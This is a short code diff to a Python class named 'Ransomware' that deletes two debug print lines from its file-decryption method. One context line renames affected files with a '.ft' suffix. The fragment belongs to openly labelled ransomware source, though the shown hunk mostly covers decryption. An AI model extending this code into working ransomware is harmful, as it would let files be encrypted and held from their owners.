@@ -42,11 +42,9 @@ class Ransomware():
             os.rename(file, file + ".ft")
 
     def dencrypt_files(self):
-        print(self.files)
         for file in self.files:
             with open(file, "rb+") as f:
                 data = self.fernet.decrypt(f.read())
-                print("data: ", data)
                 f.seek(0)
                 f.write(data)
                 f.truncate()
